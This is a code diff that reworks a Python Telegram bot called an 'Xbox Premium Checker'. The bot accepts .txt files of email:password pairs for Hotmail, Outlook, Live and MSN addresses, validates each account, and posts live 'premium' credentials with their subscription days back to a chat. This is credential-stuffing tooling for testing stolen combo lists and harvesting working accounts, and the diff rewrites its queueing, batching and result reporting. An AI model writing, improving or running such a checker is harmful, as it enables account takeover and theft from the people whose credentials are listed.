+                    batch_callback(batch_buffer.copy(), stats)
+                    batch_buffer.clear()
+                
+                time.sleep(0.2)
                 
             except Exception as e:
-                logger.error(f"Line error: {e}")
-                stats['error'] += 1
-                stats['bad'] += 1
+                stats["error"] += 1
+                stats["bad"] += 1
+                stats["checked"] += 1
+                batch_buffer.append(f"{line[:50]}... ⚠️ ERROR: {str(e)[:30]}")
+                if len(batch_buffer) >= BATCH_SIZE:
+                    batch_callback(batch_buffer.copy(), stats)
+                    batch_buffer.clear()
         
-        if batch_results:
-            msg = f"📊 **Task #{task.id} Final**\n✅ P:{stats['premium']} 🆓 F:{stats['free']} ❌ B:{stats['bad']}\n\n```\n" + "\n".join(batch_results) + "\n```"
-            await app.bot.send_message(chat_id=task.user_id, text=msg, parse_mode='Markdown')
+        # Send remaining batch
+        if batch_buffer:
+            batch_callback(batch_buffer.copy(), stats)
         
-        summary = (
-            f"✅ **TASK #{task.id} COMPLETE**\n"
-            f"┌─────────────────────────┐\n"
-            f"│ 📄 {task.file_name[:35]}\n"
-            f"│ 🔢 {stats['total']} total\n"
-            f"│ ✅ {stats['premium']} premium\n"
-            f"│ 🆓 {stats['free']} free\n"
-            f"│ ❌ {stats['bad']} bad\n"
-            f"└─────────────────────────┘"
-        )
-        await app.bot.send_message(chat_id=task.user_id, text=summary, parse_mode='Markdown')
+        # Format premium text for final summary
+        premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results])
         
-        mark_file_processed(task.file_id, task.file_name)
+        final_callback({"status": "success", "stats": stats, "premium_text": premium_text})
         
     except Exception as e:
-        logger.error(f"Process error: {e}")
-        try:
-            await app.bot.send_message(chat_id=task.user_id, text=f"❌ Error: {str(e)[:200]}")
-        except:
-            pass
-    finally:
-        remove_active_task(task.id)
-        if os.path.exists(task.file_path):
-            try:
-                os.remove(task.file_path)
-            except:
-                pass
+        final_callback({"status": "error", "error": str(e), "traceback": traceback.format_exc()})
 
-async def worker_worker():
-    """Individual worker that processes tasks"""
+def process_queue():
+    global processing_active, current_task, cancel_flag
+    
     while True:
         try:
-            if len(active_tasks) >= MAX_CONCURRENT_WORKERS:
-                await asyncio.sleep(0.1)
+            if task_queue.empty():
+                with processing_lock:
+                    processing_active = False
+                    current_task = None
+                time.sleep(1)
                 continue
             
-            task = await get_task()
-            if task:
-                add_active_task(task)
-                asyncio.create_task(process_file_task(task))
-            else:
-                await asyncio.sleep(0.1)
+            with processing_lock:
+                current_task = task_queue.get()
+                processing_active = True
+                cancel_flag = False
+            
+            asyncio.run_coroutine_threadsafe(send_processing_start(current_task), loop)
+            
+            # Batch callback for intermediate updates
+            def batch_callback(batch_results, stats):
+                asyncio.run_coroutine_threadsafe(
+                    send_batch_update(current_task, batch_results, stats),
+                    loop
+                )
+            
+            # Final callback
+            def final_callback(result):
+                if result.get("status") == "success":
+                    asyncio.run_coroutine_threadsafe(
+                        send_final_results(current_task, result["stats"], result["premium_text"]),
+                        loop
+                    )
+                elif result.get("status") == "cancelled":
+                    asyncio.run_coroutine_threadsafe(
+                        send_cancelled_message(current_task),
+                        loop
+                    )
+                else:
+                    asyncio.run_coroutine_threadsafe(
+                        send_error_message(current_task, result.get("error", "Unknown error")),
+                        loop
+                    )
+            
+            def cancel_check():
+                return cancel_flag
+            
+            run_checker_on_file(current_task.file_path, batch_callback, final_callback, cancel_check)
+            
+            if current_task.file_path and os.path.exists(current_task.file_path):
+                try:
+                    shutil.rmtree(os.path.dirname(current_task.file_path))
+                except:
+                    pass
+            
+            task_queue.task_done()
+            
         except Exception as e:
-            logger.error(f"Worker error: {e}")
-            await asyncio.sleep(1)
+            if current_task:
+                asyncio.run_coroutine_threadsafe(send_error_message(current_task, str(e)), loop)
+                task_queue.task_done()
+            time.sleep(1)
 
-async def start_workers():
-    """Start the worker pool"""
-    workers = []
-    for _ in range(MAX_CONCURRENT_WORKERS):
-        workers.append(asyncio.create_task(worker_worker()))
-    await asyncio.gather(*workers, return_exceptions=True)
+async def send_processing_start(task):
+    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n\n📊 Processing accounts... Results will appear in batches."
+    await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
 
-# ============================================================
-# TELEGRAM COMMANDS (INSTANT RESPONSE)
-# ============================================================
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stats = get_queue_stats()
-    msg = (
-        f"🎮 **XBOX CHECKER**\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"⚡ Workers: {stats['active']}/{stats['max_workers']}\n"
-        f"⏳ Queue: {stats['pending']}\n"
-        f"⏸️ Paused: {'Yes' if stats['paused'] else 'No'}\n\n"
-        f"**Commands:**\n"
-        f"/start - Menu\n/status - Stats\n/queue - Pending\n"
-        f"/active - Running\n/cancel [id] - Cancel\n/cancel_all - All\n"
-        f"/pause - Stop\n/resume - Start\n\n"
-        f"Send .txt file with email:password"
-    )
-    await update.message.reply_text(msg, parse_mode='Markdown')
-
-async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    stats = get_queue_stats()
-    msg = (
-        f"📊 **STATUS**\n━━━━━━━━━━\n"
-        f"⚡ Active: {stats['active']}/{stats['max_workers']}\n"
-        f"⏳ Pending: {stats['pending']}\n"
-        f"⏸️ Paused: {'Yes' if stats['paused'] else 'No'}"
-    )
-    await update.message.reply_text(msg, parse_mode='Markdown')
-
-async def queue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    pending = task_queue.qsize()
-    if pending == 0:
-        await update.message.reply_text("📭 No pending tasks")
-        return
-    await update.message.reply_text(f"⏳ **Pending Tasks:** {pending}", parse_mode='Markdown')
-
-async def active_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    tasks = get_active_tasks_list()
-    if not tasks:
-        await update.message.reply_text("📭 No active tasks")
-        return
-    msg = "🔄 **ACTIVE TASKS**\n━━━━━━━━━━━━━━\n"
-    for t in tasks:
-        msg += f"• #{t.id}: {t.file_name[:35]}...\n"
-    await update.message.reply_text(msg, parse_mode='Markdown')
-
-async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    args = context.args
-    if not args:
-        await update.message.reply_text("❌ Usage: `/cancel [task_id]`\nUse /active to see IDs", parse_mode='Markdown')
-        return
+async def send_batch_update(task, batch_results, stats):
+    """Send batched results (multiple accounts at once)"""
+    progress = f"📊 **Progress:** {stats['checked']}/{stats['total']} accounts checked\n"
+    progress += f"✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
+    
+    results_text = "\n".join(batch_results[:25])  # Limit to 25 per message
+    if len(batch_results) > 25:
+        results_text += f"\n... and {len(batch_results) - 25} more"
+    
+    message = progress + "```\n" + results_text + "\n```"
+    
     try:
-        task_id = int(args[0])
-        if await cancel_task(task_id):
-            await update.message.reply_text(f"✅ Task #{task_id} cancelled")
-        else:
-            await update.message.reply_text(f"❌ Task #{task_id} not found")
+        await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)
     except:
-        await update.message.reply_text("❌ Invalid ID")
+        # Fallback if message too long
+        await app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode=ParseMode.MARKDOWN)
 
-async def cancel_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    count = await cancel_all_tasks()
-    await update.message.reply_text(f"✅ Cancelled {count} tasks")
+async def send_final_results(task, stats, premium_text):
+    receipt = (
+        f"✅ **SCAN COMPLETE**\n\n"
+        f"📄 **File:** `{task.original_name}`\n"
+        f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
+        f"📊 **FINAL RESULTS**\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔢 Total: `{stats['total']}`\n"
+        f"✅ PREMIUM: `{stats['premium']}`\n"
+        f"🆓 FREE: `{stats['free']}`\n"
+        f"❌ BAD: `{stats['bad']}`\n"
+        f"⏰ Expired: `{stats['expired']}`\n"
+        f"🚫 Banned: `{stats['banned']}`\n"
+        f"🔐 2FA: `{stats['two_factor']}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+    )
+    await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
+    
+    if stats['premium'] > 0 and premium_text:
+        await app.bot.send_message(
+            chat_id=CHAT_ID,
+            text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    
+    remaining = task_queue.qsize()
+    if remaining > 0:
+        await app.bot.send_message(chat_id=CHAT_ID, text=f"📁 Next: {remaining} file(s) waiting...", parse_mode=ParseMode.MARKDOWN)
 
-async def pause_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await pause_queue()
-    await update.message.reply_text("⏸️ Queue paused")
+async def send_error_message(task, error):
+    await app.bot.send_message(chat_id=CHAT_ID, text=f"❌ **ERROR**\n\n📄 `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)
 
-async def resume_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await resume_queue()
-    await update.message.reply_text("▶️ Queue resumed")
+async def send_cancelled_message(task):
+    await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 **CANCELLED**\n\n📄 `{task.original_name}`", parse_mode=ParseMode.MARKDOWN)
+
+async def send_rejection_message(original_name, valid_count, invalid_count, invalid_examples):
+    msg = f"❌ **FILE REJECTED**\n\n📄 `{original_name}`\n🔢 Valid Microsoft accounts: `{valid_count}`\n⚠️ Skipped: `{invalid_count}` non-Microsoft account(s)"
+    if invalid_examples:
+        msg += f"\n\n**Examples rejected:**\n" + "\n".join([f"• {e}" for e in invalid_examples[:3]])
+    msg += f"\n\n✅ Allowed domains:\nhotmail.com, outlook.com, live.com, msn.com"
+    await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
+
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = (
+        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
+        "Send a `.txt` file with `email:password` format\n\n"
+        "**Allowed domains:**\n"
+        "hotmail.com, outlook.com, live.com, msn.com\n\n"
+        "**Commands:**\n"
+        "/start - This message\n"
+        "/status - Queue status\n"
+        "/cancel - Stop current scan\n\n"
+        "📊 Results appear in batches (15 accounts per update)"
+    )
+    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    with processing_lock:
+        queue_size = task_queue.qsize()
+        is_processing = processing_active
+    
+    if is_processing and current_task:
+        msg = f"📊 **Active:** `{current_task.original_name}`\n⏳ **Queue:** {queue_size} file(s)"
+    else:
+        msg = f"📊 **Idle**\n⏳ **Queue:** {queue_size} file(s)\n\nSend a .txt file to start."
+    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
+
+async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global cancel_flag
+    with processing_lock:
+        if processing_active and current_task:
+            cancel_flag = True
+            await update.message.reply_text(f"🛑 Cancelling `{current_task.original_name}`...", parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text("No active scan to cancel.")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    user_id = update.effective_user.id
+    document = update.message.document
     
-    if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Send a `.txt` file")
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please send a `.txt` file.")
         return
     
-    if is_file_processed(doc.file_id):
-        await update.message.reply_text(f"⚠️ `{doc.file_name}` already processed", parse_mode='Markdown')
-        return
-    
-    file = await context.bot.get_file(doc.file_id)
-    temp_path = f"/tmp/{doc.file_name}"
+    file = await context.bot.get_file(document.file_id)
+    temp_dir = tempfile.mkdtemp()
+    temp_path = os.path.join(temp_dir, document.file_name)
     await file.download_to_drive(temp_path)
     
-    with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
-        lines = [l.strip() for l in f if l.strip() and ':' in l]
+    filtered_path, valid_count, invalid_count, invalid_examples = validate_and_filter_file(temp_path)
     
-    if not lines:
-        await update.message.reply_text(f"❌ No valid accounts in {doc.file_name}")
-        os.remove(temp_path)
+    if filtered_path is None or valid_count == 0:
+        await send_rejection_message(document.file_name, valid_count, invalid_count, invalid_examples)
+        shutil.rmtree(temp_dir)
         return
     
-    task_id = await add_task(temp_path, doc.file_name, doc.file_id, user_id)
-    stats = get_queue_stats()
+    task = ScanTask(file_path=filtered_path, original_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
+    task_queue.put(task)
+    queue_size = task_queue.qsize()
     
     await update.message.reply_text(
-        f"✅ **File Accepted**\n━━━━━━━━━━━━━━━━\n"
-        f"📄 `{doc.file_name}`\n"
-        f"🔢 {len(lines)} accounts\n"
-        f"📊 Task ID: `#{task_id}`\n"
-        f"⚡ Active: {stats['active']}/{stats['max_workers']}\n"
-        f"⏳ Queue: {stats['pending']}\n\n"
-        f"🔄 Processing with 9-step Xbox validation",
-        parse_mode='Markdown'
+        f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Valid: `{valid_count}` accounts\n📊 Queue: `{queue_size}`\n\n🔄 Starting REAL Xbox validation...\n📦 Results will appear in batches every 15 accounts.",
+        parse_mode=ParseMode.MARKDOWN
     )
-
-# ============================================================
-# MAIN
-# ============================================================
-
-app = None
-
-async def main():
-    global app
     
-    init_db()
+    if invalid_count > 0:
+        await update.message.reply_text(f"⚠️ Skipped `{invalid_count}` non-Microsoft account(s)", parse_mode=ParseMode.MARKDOWN)
     
-    app = Application.builder().token(MAIN_BOT_TOKEN).build()
+    with processing_lock:
+        if not processing_active:
+            thread = threading.Thread(target=process_queue, daemon=True)
+            thread.start()
+
+def main():
+    global app, loop
+    app = Application.builder().token(BOT_TOKEN).build()
+    loop = asyncio.get_event_loop()
     
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(CommandHandler("queue", queue_cmd))
-    app.add_handler(CommandHandler("active", active_cmd))
-    app.add_handler(CommandHandler("cancel", cancel_cmd))
-    app.add_handler(CommandHandler("cancel_all", cancel_all_cmd))
-    app.add_handler(CommandHandler("pause", pause_cmd))
-    app.add_handler(CommandHandler("resume", resume_cmd))
+    app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("cancel", cancel_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    # Start worker pool
-    asyncio.create_task(start_workers())
-    
-    print("\n" + "="*60)
-    print("🎮 XBOX PREMIUM CHECKER - GOD MODE")
-    print("="*60)
-    print(f"Bot: {MAIN_BOT_TOKEN[:15]}...")
-    print(f"Workers: {MAX_CONCURRENT_WORKERS} concurrent")
-    print("✓ Instant command responses")
-    print("✓ Non-blocking async queue")
-    print("✓ 9-step Xbox validation")
-    print("✓ Aesthetic premium formatting")
-    print("="*60 + "\n")
-    
-    await app.initialize()
-    await app.start()
-    await app.updater.start_polling()
-    
-    try:
-        await asyncio.Event().wait()
-    except KeyboardInterrupt:
-        pass
-    finally:
-        await app.stop()
+    print("🤖 Xbox Checker Bot Running (Batch Mode)...")
+    print("Results will be sent in batches of 15 accounts")
+    print("Waiting for .txt files...")
+    app.run_polling()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
